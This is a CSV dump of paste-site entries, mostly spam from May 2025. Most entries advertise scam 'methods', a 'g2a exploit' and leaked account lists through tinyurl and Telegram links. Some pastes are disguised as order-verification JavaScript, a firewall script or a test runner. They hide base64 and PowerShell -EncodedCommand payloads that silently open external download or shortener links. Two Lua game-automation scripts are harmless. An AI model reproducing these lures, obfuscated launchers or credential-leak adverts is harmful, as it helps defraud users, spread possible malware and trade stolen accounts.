id,title,username,language,date,content
9E4uqetx,Stake Free Balance Method,jm33,JavaScript,Tuesday 6th of May 2025 12:20:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18178
0H4MxtKL,Products.js,x2LeaF,JavaScript,Tuesday 6th of May 2025 12:20:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16956/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wBbTqENL,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Tuesday 6th of May 2025 12:19:45 AM CDT,71669 Accounts Posted On https://t.me/leakzbyeminem
1YVp9gWw,EARN $900 INSTANTLY 2025 EI,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:17:16 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

AnqBc1kYYq
"
k2BGJDAD,护盾控制 红网投屏发射,jaklsfjlsak,Lua,Tuesday 6th of May 2025 12:16:38 AM CDT,"-- Horizontal Mining Offset UI with Toggle & Status Monitoring Only

-- 1) Screen wrappers (computer + monitors)
local screens = {}

-- wrap the terminal itself
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = term.getSize,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- wrap any attached monitors
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = m.getSize,
      setTextColor       = m.setTextColor,
      setBackgroundColor = m.setBackgroundColor,
      setCursorPos       = m.setCursorPos,
      write              = m.write,
      monitor            = m,
    })
  end
end

-- 2) Auto-scale monitors so at least 7 lines fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Drawing helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static UI texts
local titleText    = ""Horizontal Mining System""
local subtitleText = ""Guided Mining Offset Only""
local offsetText   = ""Offset Mode (T): ""
local promptH      = ""Press H for Main Menu""
local promptT      = ""Press T to Toggle Offset""

-- offset state
local isOffsetOn = false

-- 5) Draw header + offset-state line
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1)
    s.setTextColor(colors.white); s.setBackgroundColor(colors.black)
    s.setCursorPos(math.floor((w-#titleText)/2)+1,1); s.write(titleText)
    -- Subtitle (line 3)
    s.setTextColor(colors.black); s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(math.floor((w-#subtitleText)/2)+1,3); s.write(subtitleText)
    -- Blank line 4
    -- Offset-state (line 5)
    local status = isOffsetOn and ""ON"" or ""OFF""
    local full   = offsetText..status
    s.setTextColor(colors.black); s.setBackgroundColor(colors.lightGray)
    s.setCursorPos(1,5); s.write(string.rep("" "", w))
    s.setCursorPos(math.floor((w-#full)/2)+1,5); s.write(offsetText)
    s.setTextColor(colors.white)
    s.setBackgroundColor(isOffsetOn and colors.lime or colors.red)
    s.write(status)
  end)
end

-- 6) Draw bottom prompt lines (lines h-1 and h)
local function drawPrompt()
  forAll(function(s)
    local w,h = s.getSize()
    -- line h-1: Toggle (T)
    s.setTextColor(colors.white); s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h-1); s.write(string.rep("" "",w))
    s.setCursorPos(math.floor((w-#promptT)/2)+1,h-1); s.write(promptT)
    -- line h: Main menu (H)
    s.setTextColor(colors.white); s.setBackgroundColor(colors.blue)
    s.setCursorPos(1,h);   s.write(string.rep("" "",w))
    s.setCursorPos(math.floor((w-#promptH)/2)+1,h);   s.write(promptH)
  end)
end

-- 7) Open all modems for Rednet and send initial check
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""modem"" then
    rednet.open(side)
  end
end
rednet.broadcast(""check"", ""SMiner"")

-- 8) Initial draw
clearAll()
drawStatic()
drawPrompt()

-- 9) Listen for SMiner status updates so we can refresh UI if another controller toggles
local function statusListener()
  while true do
    local _, msg = rednet.receive(""SMiner"")
    if msg == ""StatON"" then
      isOffsetOn = true
      clearAll(); drawStatic(); drawPrompt()
    elseif msg == ""StatOFF"" then
      isOffsetOn = false
      clearAll(); drawStatic(); drawPrompt()
    end
  end
end

-- 10) Main event loop: handle key presses to toggle or reboot
local function mainLoop()
  while true do
    local ev, key = os.pullEvent(""key"")
    if key == keys.t then
      -- flip local state, broadcast to others, and redraw
      isOffsetOn = not isOffsetOn
      rednet.broadcast(isOffsetOn and ""StatON"" or ""StatOFF"", ""SMiner"")
      clearAll(); drawStatic(); drawPrompt()
    elseif key == keys.h then
      os.reboot()
    end
  end
end

-- 11) Run both loops in parallel
parallel.waitForAny(statusListener, mainLoop)
"
XGxKGhKZ,configure_firewall.ps1,Rip_batate,Batch,Tuesday 6th of May 2025 12:14:57 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgAyADYAMgAwADQAMgA3AA==
EXIT /b
"
9Kd58KWh,run_tests.bat,Rip_batate,Batch,Tuesday 6th of May 2025 12:14:25 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgAxADcANABlADkAMwAyAA==
EXIT /b
"
q2iyPLjn,Make $1000 15 - MINUTES(BEGINNER) YR,bodelike,JavaScript,Tuesday 6th of May 2025 12:14:21 AM CDT,099055 - check it out at www.tinyurl.com/new2025may
NnF759Z0,Untitled,alexgt1,JSON,Tuesday 6th of May 2025 12:14:08 AM CDT,"[
  {
    ""id"": ""f397649eff72caa5"",
    ""key"": ""key22"",
    ""expiresAt"": ""2025-04-04"",
    ""allowOffline"": true
  },
  {
    ""id"": ""ali456"",
    ""key"": ""key2"",
    ""expiresAt"": ""2025-06-15"",
    ""allowOffline"": false
  }
]"
Pn4ZTcPc,Make $1000 15-MINUTES (BEGINNER) OV,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:10:33 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

6A19TLQQOg
"
1vF6tdUF,护盾控制 执行,jaklsfjlsak,Lua,Tuesday 6th of May 2025 12:10:06 AM CDT,"-- Shield State Broadcaster & Remote Controller (“SMiner‐Standalone”)

-- 1) Configuration
local shield  = peripheral.find(""warpdriveForceFieldProjector"")
assert(shield, ""warpdriveForceFieldProjector not found!"")

-- 2) Open all modems for Rednet
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""modem"" then
    rednet.open(side)
  end
end

-- 3) State‐monitor coroutine
local function stateMonitor()
  local prev = shield.enable()
  while true do
    local now = shield.enable()
    if now ~= prev then
      rednet.broadcast(now and ""StatON"" or ""StatOFF"", ""SMiner"")
      prev = now
    end
    os.sleep(0.5)
  end
end

-- 4) Command‐listener coroutine
local function commandListener()
  while true do
    local _, msg = rednet.receive(""SMiner"")
    if msg == ""Enable"" then
      shield.enable(true)
    elseif msg == ""Disable"" then
      shield.enable(false)
    end
  end
end

-- 5) Run both loops in parallel
parallel.waitForAny(stateMonitor, commandListener)
"
yxuB1fJS,Scam Casinos and Stores,jm33,JavaScript,Tuesday 6th of May 2025 12:05:08 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 02669
xpZUnuKd,Order.js,x2LeaF,JavaScript,Tuesday 6th of May 2025 12:04:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84808/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Kr7TuFGd,Chaturbate with Tokens,hubertzoo90,JavaScript,Tuesday 6th of May 2025 12:04:23 AM CDT,89006 Accounts Posted On https://t.me/leakzbyeminem
HKT1gWm4,Make $1000 15 - MINUTES(BEGINNER) YR,bodelike,JavaScript,Tuesday 6th of May 2025 12:04:00 AM CDT,682222 - check it out at www.tinyurl.com/new2025may
XrDMfnAU,Make $1000 15 - MINUTES(BEGINNER) YR,bodelike,JavaScript,Tuesday 6th of May 2025 12:03:39 AM CDT,487276 - check it out at www.tinyurl.com/new2025may
